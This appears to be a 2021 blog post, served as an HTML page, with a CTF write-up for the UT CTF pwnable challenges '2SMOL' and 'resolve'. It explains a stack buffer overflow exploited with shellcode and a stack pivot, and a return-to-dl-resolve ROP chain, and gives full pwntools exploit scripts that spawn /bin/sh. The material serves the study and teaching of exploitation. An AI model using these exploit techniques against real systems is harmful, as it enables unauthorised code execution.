@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"pwnkidhn.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="2021 UT CTF Write-up    2SMOL (pwnable)vulnerability First, Check the protection. All of protection is turned off.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021 UT CTF">
+<meta property="og:url" content="https://pwnkidhn.github.io/2021/03/12/2021-03-13-UT_CTF_2021/index.html">
+<meta property="og:site_name" content="rvkhunLab">
+<meta property="og:description" content="2021 UT CTF Write-up    2SMOL (pwnable)vulnerability First, Check the protection. All of protection is turned off.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/111152857-8ff9b600-85d4-11eb-9dbd-86f5679cd799.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/111152849-8c662f00-85d4-11eb-8ccb-c393df5329c3.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/111152852-8e2ff280-85d4-11eb-899a-2cae6da1e8a6.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/111154625-c59f9e80-85d6-11eb-84fe-5de9baf007c9.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/111156001-92f6a580-85d8-11eb-8e21-c7cdab70b5a7.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/111622144-2aa00200-882c-11eb-83f4-e8f4510ff132.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/111622787-ef520300-882c-11eb-82fc-556f204c52f1.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/111624452-0e519480-882f-11eb-99ec-fd5203e6193d.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/111624688-5670b700-882f-11eb-8768-62752ec2dfe5.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/111625605-62a94400-8830-11eb-8a6e-86332e5f4ffa.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/49066484/111626406-4fe33f00-8831-11eb-99a7-94710e34cbe0.png">
+<meta property="article:published_time" content="2021-03-12T15:00:00.000Z">
+<meta property="article:modified_time" content="2021-09-25T19:05:56.993Z">
+<meta property="article:author" content="rvkhun">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="pwnable">
+<meta property="article:tag" content="write-up">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/49066484/111152857-8ff9b600-85d4-11eb-9dbd-86f5679cd799.png">
+
+<link rel="canonical" href="https://pwnkidhn.github.io/2021/03/12/2021-03-13-UT_CTF_2021/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>2021 UT CTF | rvkhunLab</title>
+  <meta name="google-site-verification" content="eBj8hDfb8V5sujjVERa_zAbaTQFLbQzowFQfUz3Rhw8">
+  <meta name="naver-site-verification" content="7c18a15cd138e9448d263381fe6201215fc40046">
+
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/rss2.xml" title="rvkhunLab" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">rvkhunLab</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Write about System Hacking</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>Sitemap</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://pwnkidhn.github.io/2021/03/12/2021-03-13-UT_CTF_2021/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/raccoon1.jpg">
+      <meta itemprop="name" content="rvkhun">
+      <meta itemprop="description" content="Security Researcher / CTF Player">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rvkhunLab">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2021 UT CTF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-03-13 00:00:00" itemprop="dateCreated datePublished" datetime="2021-03-13T00:00:00+09:00">2021-03-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-09-26 04:05:56" itemprop="dateModified" datetime="2021-09-26T04:05:56+09:00">2021-09-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Write-up/" itemprop="url" rel="index"><span itemprop="name">Write-up</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <center>2021 UT CTF Write-up </center>
+
+
+<h1 id="2SMOL-pwnable"><a href="#2SMOL-pwnable" class="headerlink" title="2SMOL (pwnable)"></a>2SMOL (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/111152857-8ff9b600-85d4-11eb-9dbd-86f5679cd799.png" alt="3"></p>
+<p>First, Check the protection. All of protection is turned off. </p>
+<span id="more"></span>
+<p><img src="https://user-images.githubusercontent.com/49066484/111152849-8c662f00-85d4-11eb-8ccb-c393df5329c3.png" alt="1"></p>
+<p><img src="https://user-images.githubusercontent.com/49066484/111152852-8e2ff280-85d4-11eb-899a-2cae6da1e8a6.png" alt="2"></p>
+<p>It called only <code>read</code>functions. but the size of read is bigger than buffer. It is Buffer OverFlow.<br>And NXbit is turned off, So I can use shellcode to exploit.</p>
+<p><img src="https://user-images.githubusercontent.com/49066484/111154625-c59f9e80-85d6-11eb-84fe-5de9baf007c9.png" alt="4"></p>
+<p>But we only have 0x8 size to write. It is not enough to write shellcode on the stack, and also even if we can write shellcode on the stack, we can’t leak the stack address. </p>
+<p><img src="https://user-images.githubusercontent.com/49066484/111156001-92f6a580-85d8-11eb-8e21-c7cdab70b5a7.png" alt="6"></p>
+<p>So we have to write on memory which we know address. It is <code>0x402000</code>. We can change the flow by using <code>leave ret</code> gadgets. then  we can write shellcode on memory. Lastly, overwrite return address to shellcode’s address.</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.utctf.live&#x27;</span>, <span class="number">9998</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./smol&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./smol&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x402018</span></span><br><span class="line">fakerbp = <span class="number">0x402068</span></span><br><span class="line">syscall = <span class="number">0x40103d</span></span><br><span class="line">before_read = <span class="number">0x401015</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(before_read)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&quot;\x90&quot;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(fakerbp)</span><br><span class="line">payload += p64(before_read)</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">0x402028</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="resolve-pwnable"><a href="#resolve-pwnable" class="headerlink" title="resolve (pwnable)"></a>resolve (pwnable)</h1><h2 id="vulnerability-1"><a href="#vulnerability-1" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/111622144-2aa00200-882c-11eb-83f4-e8f4510ff132.png" alt="1"></p>
+<p>First, Check the protection. No canary, No pie and Partial RELRO. It is easy to overwrite stack buffer.</p>
+<p><img src="https://user-images.githubusercontent.com/49066484/111622787-ef520300-882c-11eb-82fc-556f204c52f1.png" alt="2"></p>
+<p>The main function only call <code>get@plt</code>. It can occur overflow here. But there is no way to leak libc address and also doesn’t have system functions which can call <code>/bin/sh</code> in binary. But the method for exploit can be inferred from the name of the problem. The name is <code>resolve</code>. So i used <code>return-to-dl-resolve</code>. </p>
+<p>If you don’t know well about this, Please refer to the reference.</p>
+<blockquote>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.lazenca.net/pages/viewpage.action?pageId=19300744">https://www.lazenca.net/pages/viewpage.action?pageId=19300744</a></p>
+</blockquote>
+<p>Then let’s find gadgets for exploit.</p>
+<p><img src="https://user-images.githubusercontent.com/49066484/111624452-0e519480-882f-11eb-99ec-fd5203e6193d.png" alt="3"></p>
+<p>There is <code>get</code>function. so i only need to control <code>rdi</code> for calling function. </p>
+<p><img src="https://user-images.githubusercontent.com/49066484/111624688-5670b700-882f-11eb-8768-62752ec2dfe5.png" alt="55"></p>
+<p>And get section address what i need. like <code>plt</code>, <code>bss</code>, <code>dynsym</code>, <code>dynstr</code>, <code>rela.plt</code>…</p>
+<p>Using <code>ROP</code>, make fake structure which is used by <code>lazy binding</code> and write on the memory which i know address. </p>
+<p><img src="https://user-images.githubusercontent.com/49066484/111625605-62a94400-8830-11eb-8a6e-86332e5f4ffa.png" alt="66"></p>
+<p>In my case, I wrote on 0x404508. The red is fake structure of <strong>Elf64_Rela</strong>. And the orange is about <strong>Elf64_Sym</strong>. The last things are <code>system</code> and <code>/bin/sh</code>. </p>
+<p>After making fake structure, The system function is executed by invoking the <code>plt</code>.</p>
+<p><img src="https://user-images.githubusercontent.com/49066484/111626406-4fe33f00-8831-11eb-99a7-94710e34cbe0.png" alt="8"></p>
+<p>Finally, I can call <code>system(/bin/sh/)</code> </p>
+<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;pwn.utctf.live&#x27;,5435)</span></span><br><span class="line">p = process(<span class="string">&#x27;./resolve&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./resolve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x004011c3</span></span><br><span class="line">prsi = <span class="number">0x004011c1</span></span><br><span class="line">leave_ret = <span class="number">0x00401158</span></span><br><span class="line">get_got = <span class="number">0x404018</span></span><br><span class="line">get_plt = <span class="number">0x401040</span></span><br><span class="line">get_code = <span class="number">0x040114e</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x404550</span></span><br><span class="line">ret = <span class="number">0x401159</span></span><br><span class="line">addr_code_get = <span class="number">0x0401142</span></span><br><span class="line"></span><br><span class="line">addr_bss = <span class="number">0x404508</span> <span class="comment">#fake_ebp</span></span><br><span class="line">addr_plt = <span class="number">0x401020</span></span><br><span class="line">addr_got_plt = <span class="number">0x404000</span></span><br><span class="line">addr_dynsym = <span class="number">0x4003c0</span></span><br><span class="line">addr_dynstr = <span class="number">0x400420</span></span><br><span class="line">addr_rela_plt = <span class="number">0x4004b8</span></span><br><span class="line">fake_reloc_struct = <span class="number">0x404508</span></span><br><span class="line">fake_r_sym = <span class="number">0x404530</span></span><br><span class="line">fake_str = <span class="number">0x404548</span></span><br><span class="line">offset = <span class="number">0x2ae</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#stage1</span></span><br><span class="line"><span class="comment">#call read again for writting payload2 on .bss</span></span><br><span class="line"><span class="comment">#and call get_plt, trigger resolve</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span>*<span class="number">16</span></span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(addr_bss)</span><br><span class="line">payload += p64(get_plt)</span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line"><span class="comment">#ret instruction to prevent stack alignment failure in Ubuntu 18.04 or higher</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(addr_plt)</span><br><span class="line">payload += p64(offset)</span><br><span class="line"></span><br><span class="line"><span class="comment">#stage2</span></span><br><span class="line"><span class="comment">#write payload2 on .bss </span></span><br><span class="line">payload1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#fake_reloc_struct</span></span><br><span class="line">payload1 += p64(get_got)</span><br><span class="line">payload1 += p32(<span class="number">0x7</span>)</span><br><span class="line">payload1 += p32(<span class="number">0x2ba</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>) * <span class="number">3</span></span><br><span class="line"></span><br><span class="line">payload1 += p32(<span class="number">0x4128</span>)</span><br><span class="line">payload1 += p32(<span class="number">0x12</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x0</span>)</span><br><span class="line">payload1 += <span class="string">&quot;system\x00\x00&quot;</span></span><br><span class="line">payload1 += <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/pwnable/" rel="tag"># pwnable</a>
+              <a href="/tags/write-up/" rel="tag"># write-up</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/06/2021-03-07-zer0pts_CTF_2021/" rel="prev" title="2021 zer0pts CTF">
+      <i class="fa fa-chevron-left"></i> 2021 zer0pts CTF
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/04/04/2021-04-03-Shakti_CTF_2021/" rel="next" title="2021 Shakti CTF">
+      2021 Shakti CTF <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2SMOL-pwnable"><span class="nav-number">1.</span> <span class="nav-text">2SMOL (pwnable)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#vulnerability"><span class="nav-number">1.1.</span> <span class="nav-text">vulnerability</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit"><span class="nav-number">1.2.</span> <span class="nav-text">exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#resolve-pwnable"><span class="nav-number">2.</span> <span class="nav-text">resolve (pwnable)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#vulnerability-1"><span class="nav-number">2.1.</span> <span class="nav-text">vulnerability</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit-1"><span class="nav-number">2.2.</span> <span class="nav-text">exploit</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rvkhun" src="/images/raccoon1.jpg">
+  <p class="site-author-name" itemprop="name">rvkhun</p>
+  <div class="site-description" itemprop="description">Security Researcher / CTF Player</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:pwnkidhn@gmail.com" title="E-Mail → mailto:pwnkidhn@gmail.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-envelope"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://instagram.com/_choizy_" title="Instagram → https:&#x2F;&#x2F;instagram.com&#x2F;_choizy_" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-instagram"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rvkhun</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Gemini</a>
+  </div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
